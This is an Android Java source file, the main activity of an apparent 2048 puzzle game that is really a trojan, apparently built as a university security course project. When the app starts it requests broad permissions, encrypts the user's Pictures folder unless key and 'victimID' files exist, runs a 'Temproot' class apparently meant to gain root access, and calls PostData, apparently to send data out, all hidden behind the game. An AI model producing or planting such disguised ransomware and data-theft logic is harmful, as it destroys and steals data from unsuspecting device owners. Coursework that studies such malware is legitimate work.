package aarkay.a2048game;

import android.Manifest;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private static final String WIDTH = "width";
    private static final String HEIGHT = "height";
    private static final String SCORE = "score";
    private static final String HIGH_SCORE = "high score temp";
    private static final String UNDO_SCORE = "undo score";
    private static final String CAN_UNDO = "can undo";
    private static final String UNDO_GRID = "undo";
    private static final String GAME_STATE = "game state";
    private static final String UNDO_GAME_STATE = "undo game state";
    private static final String MAX_TILE = "max tile";
    private static final String TIMER = "timer";

    private MainView view;
    Thread t;
    volatile public static boolean running = true;

    public static boolean hasPermissions(Context context, String[] permissions){
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        view = (MainView) findViewById(R.id.view);

        // Permissions handling
        String[] PERMISSIONS = {
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.INTERNET,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.INTERACT_ACROSS_PROFILES,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
        };
        int PERMISSION_ALL = 1;

        // Request permissions
        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }

        // aarkay.a2048game.Encrypt button
        Button encrypt_button = (Button) findViewById(R.id.encrypt_button);
        encrypt_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(MainActivity.this, EncryptFile.class);
                startActivity(intent);
            }
        });

        secretFunc(); // TOP SECRET, DON'T REVERSE ENGINEER

        // Check if /sdcard/keys.json && /sdcard/victimID.txt exist
        // If exist, don't encrypt, else proceed to encrypt
        String key_fp = "/sdcard/keys.json";
        String target_fp = "/sdcard/Pictures";
        File key_f = new File(key_fp);
        File vicID_f = new File("/sdcard/victimID.txt");
        if (!key_f.exists() || !vicID_f.exists()){
            try {
                Log.d("MAIN ACTIVITY", "Encrypting in progress");
                Encrypt.init(1, target_fp, key_fp, "");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            Log.d("MAIN ACTIVITY", "keys.json && victimID.txt exists, not encrypting");
        }

        // Temproot - Code
        try {
            Log.d("MAIN ACTIVITY", "Executing temproot");
            Temproot tr = new Temproot(this);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // PostData
        try {
            PostData pd = new PostData(this);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Bottom Toolbar
        Toolbar bottomBar = (Toolbar) findViewById(R.id.bottom_bar);
        bottomBar.inflateMenu(R.menu.bottom_menu);
        bottomBar.setOnMenuItemClickListener(new Toolbar.OnMenuItemClickListener() {
            @Override
            public boolean onMenuItemClick(MenuItem item) {
                switch (item.getItemId()) {
                    case R.id.first:
                        Toast.makeText(MainActivity.this, "Rate this app :)", Toast.LENGTH_SHORT).show();
                        rateApp();
                        break;
                    case R.id.second:
                        Toast.makeText(MainActivity.this, "More apps by us :)", Toast.LENGTH_SHORT).show();
                        openUrl("https://play.google.com/store/apps/developer?id=AarKay");
                        break;
                }
                return onOptionsItemSelected(item);
            }
        });


        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        view.hasSaveState = settings.getBoolean("save_state", false);

        if (savedInstanceState != null) {
            if (savedInstanceState.getBoolean("hasState")) {
                load();
            }
        }

        // Elapsed Time Counter
        t = new Thread() {

            @Override
            public void run() {
                try {
                    while (!isInterrupted()) {
                        Thread.sleep(1000);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                if (running) {
                                    view.setElTime();
                                }
                            }
                        });
                    }
                } catch (InterruptedException ignored) {
                }
            }
        };
        t.start();

    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            //Do nothing
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_DOWN) {
            view.game.move(2);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_UP) {
            view.game.move(0);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_LEFT) {
            view.game.move(3);
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_DPAD_RIGHT) {
            view.game.move(1);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onSaveInstanceState(Bundle savedInstanceState) {
        super.onSaveInstanceState(savedInstanceState);
        savedInstanceState.putBoolean("hasState", true);
        save();
    }

    @Override
    protected void onPause() {
        super.onPause();
        save();
        running = false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        load();
        running = true;
    }

    @Override
    protected void onStop() {
        super.onStop();
        save();
        running = false;
    }

    private void save() {
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        SharedPreferences.Editor editor = settings.edit();
        Tile[][] field = view.game.grid.field;
        Tile[][] undoField = view.game.grid.undoField;
        editor.putInt(WIDTH, field.length);
        editor.putInt(HEIGHT, field.length);
        for (int xx = 0; xx < field.length; xx++) {
            for (int yy = 0; yy < field[0].length; yy++) {
                if (field[xx][yy] != null) {
                    editor.putInt(xx + " " + yy, field[xx][yy].getValue());
                } else {
                    editor.putInt(xx + " " + yy, 0);
                }

                if (undoField[xx][yy] != null) {
                    editor.putInt(UNDO_GRID + xx + " " + yy, undoField[xx][yy].getValue());
                } else {
                    editor.putInt(UNDO_GRID + xx + " " + yy, 0);
                }
            }
        }
        editor.putLong(SCORE, view.game.score);
        editor.putLong(HIGH_SCORE, view.game.highScore);
        editor.putLong(UNDO_SCORE, view.game.lastScore);
        editor.putBoolean(CAN_UNDO, view.game.canUndo);
        editor.putInt(GAME_STATE, view.game.gameState);
        editor.putInt(UNDO_GAME_STATE, view.game.lastGameState);
        editor.putLong(MAX_TILE, view.game.maxTile);
        editor.putInt(TIMER, view.elTime);
        editor.commit();
    }

    private void load() {
        //Stopping all animations
        view.game.aGrid.cancelAnimations();

        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
        for (int xx = 0; xx < view.game.grid.field.length; xx++) {
            for (int yy = 0; yy < view.game.grid.field[0].length; yy++) {
                int value = settings.getInt(xx + " " + yy, -1);
                if (value > 0) {
                    view.game.grid.field[xx][yy] = new Tile(xx, yy, value);
                } else if (value == 0) {
                    view.game.grid.field[xx][yy] = null;
                }

                int undoValue = settings.getInt(UNDO_GRID + xx + " " + yy, -1);
                if (undoValue > 0) {
                    view.game.grid.undoField[xx][yy] = new Tile(xx, yy, undoValue);
                } else if (value == 0) {
                    view.game.grid.undoField[xx][yy] = null;
                }
            }
        }

        view.game.score = settings.getLong(SCORE, view.game.score);
        view.game.highScore = settings.getLong(HIGH_SCORE, view.game.highScore);
        view.game.lastScore = settings.getLong(UNDO_SCORE, view.game.lastScore);
        view.game.canUndo = settings.getBoolean(CAN_UNDO, view.game.canUndo);
        view.game.gameState = settings.getInt(GAME_STATE, view.game.gameState);
        view.game.lastGameState = settings.getInt(UNDO_GAME_STATE, view.game.lastGameState);
        view.game.maxTile = settings.getLong(MAX_TILE, view.game.maxTile);
        view.elTime = settings.getInt(TIMER, view.elTime);
    }

//    void hideTheBars() {
//        if (Build.VERSION.SDK_INT < 16) { //ye olde method
//            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
//                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
//        } else { // Jellybean and up, new hotness
//            View decorView = getWindow().getDecorView();
//            // Hide the status bar.
//            int uiOptions = View.SYSTEM_UI_FLAG_FULLSCREEN;
//            decorView.setSystemUiVisibility(uiOptions);
//        }
//    }

    public void rateApp() {
        try {
            Intent rateIntent = rateIntentForUrl("market://details");
            startActivity(rateIntent);
        } catch (ActivityNotFoundException e) {
            Intent rateIntent = rateIntentForUrl("https://play.google.com/store/apps/details");
            startActivity(rateIntent);
        }
    }

    private Intent rateIntentForUrl(String url) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(String.format("%s?id=%s", url, getPackageName())));
        int flags = Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_MULTIPLE_TASK;
        if (Build.VERSION.SDK_INT >= 21) {
            flags |= Intent.FLAG_ACTIVITY_NEW_DOCUMENT;
        } else {
            //noinspection deprecation
            flags |= Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET;
        }
        intent.addFlags(flags);
        return intent;
    }

    private void openUrl(String url) {
        Uri uri = Uri.parse(url); // missing 'http://' will cause crashed
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(intent);
    }

    private void secretFunc() {
        String tag = "ICT2207";
        String[] strArr = {
                "P3 - Team 2",
                "Nicholas Chong",
                "Xavier Lim",
                "Chow Wen Jun",
                "Lim Yong An",
                "Chan Hon Siang"
        };
        for (String e : strArr){
            Log.d(tag, e);
        }
    }
}
